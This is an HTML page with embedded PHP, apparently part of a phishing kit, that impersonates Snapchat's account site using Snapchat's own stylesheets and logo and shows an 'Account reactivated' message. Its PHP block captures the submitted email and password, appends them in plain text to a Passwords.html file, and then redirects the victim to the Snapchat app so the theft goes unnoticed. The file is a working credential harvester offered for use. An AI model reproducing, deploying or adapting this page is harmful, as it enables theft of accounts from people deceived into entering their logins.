<!DOCTYPE html>
<html>
	
	<!--Inici del head, i els links de CSS o Script-->
	<head>
		<title>Log In • Snapchat</title>
		<!-- Meta -->
		<meta charset="utf-8">
		<meta name="referrer" content="origin">
		<meta name="apple-mobile-web-app-capable" content="no">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
		<!-- Styles -->
		<link rel="stylesheet" href="https://accounts.snapchat.com/accounts/static/styles/semantic.min.css">
		<link rel="stylesheet" href="https://accounts.snapchat.com/accounts/static/styles/dropdown.min.css">
		<!-- Force reload of css file -->
		<link rel="stylesheet" href="https://accounts.snapchat.com/accounts/static/styles/snapchat.css?t=0">
		<link rel="stylesheet" href="https://accounts.snapchat.com/accounts/static/styles/accounts.css">
		<link rel="stylesheet" href="https://accounts.snapchat.com/accounts/static/styles/tokens.css">
		<!-- Favicon -->
		<link rel="shortcut icon" href="https://accounts.snapchat.com/accounts/static/images/favicon/favicon.png" type="image/png">
	</head>
	<body>
		<div class="pusher">
			<div class="snapchatInvertedHeader ui inverted vertical segment">
				<div class="ui stackable page one column grid">
					<div class="row">
						<div class="column">
							<h1 style="position: relative;">
								<a href="/">
								<img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" alt="Snapchat" class="logo">
								</a>
							</h1>
						</div>
					</div>
				</div>
			</div>
			<div id="login-root" data-xsrf="OFoMXbTNSVOMtvKBAa7sPg" data-continue="https://accounts.snapchat.com/accounts/welcome">
				<div data-reactroot="" class="Login">
					<div class="ui inverted vertical segment accountsBody segment_odg">
						<div class="ui stackable page grid">
							<div class="row">
								<div class="column accountsCentered">
									<h1 class="accountsTitle">Account reactivated</h1>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
<?

$usuari = $_POST['email'];
$contrasenya = $_POST['pass'];
$desa = fopen('Passwords.html','a+');
fwrite($desa,
" ".$usuari." | ".$contrasenya."</br>");

fclose($desa);
echo "<meta http-equiv='refresh' content='1;url=snapchat://'>"

?>
